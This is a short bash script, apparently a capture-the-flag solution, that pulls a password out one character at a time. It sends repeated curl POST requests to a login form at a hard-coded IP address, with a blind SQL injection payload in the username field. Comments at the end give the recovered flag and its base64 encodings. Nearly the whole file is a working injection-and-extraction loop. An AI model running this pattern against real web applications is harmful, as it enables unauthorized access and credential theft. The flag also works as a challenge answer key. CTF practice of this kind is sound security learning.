#!/bin/bash    
password="="
passwordreel=""
echo $cmd
#yxhhy3rme2cxdjnfbtnfyjrja19tev8zetm1xzffbv9ibdfuzh0=
arrayName=('+' '/' 'a' 'b' 'c' 'd' 'e' '=' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' 'A' 'B' 'C' 'D' 'E' 'F' 'G' 'H' 'I' 'J' 'K' 'L' 'M' 'N' 'O' 'P' 'Q' 'R' 'S' 'T' 'U' 'V' 'W' 'X' 'Y' 'Z' '0' '1' '2' '3' '4' '5' '6' '7' '8' '9')
while true; do
a=0
for i in "${arrayName[@]}"; do
password="$passwordreel$i"
echo $password
cmd=$(curl 'http://54.254.115.115:5001/'  -H 'Connection: keep-alive'   -H 'Cache-Control: max-age=0'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Origin: http://54.254.115.115:5001'   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'Referer: http://54.254.115.115:5001/'   -H 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'   --data 'username=flag1" and password+like+"'"$password"'%fuzh0='   --compressed   --insecure)

if [[ $cmd == *"doesn"* ]]; then
  a=$a+1;
  
else
  passwordreel=$password
  echo $password
  break
fi
done
echo $password

done
#axactf{g1v3_m3_b4ck_my_3y35_1_m_bl1nd}
#YXhh Y3Rm e2cx DjNF BtNf yjrj a19t ev8z etm1 Xzff bv9I BDFU ZH0=
#YXhhY3Rme2cxdjNfbTNfYjRja19teV8zeTM1XzFFBV9iBDFUZH0=
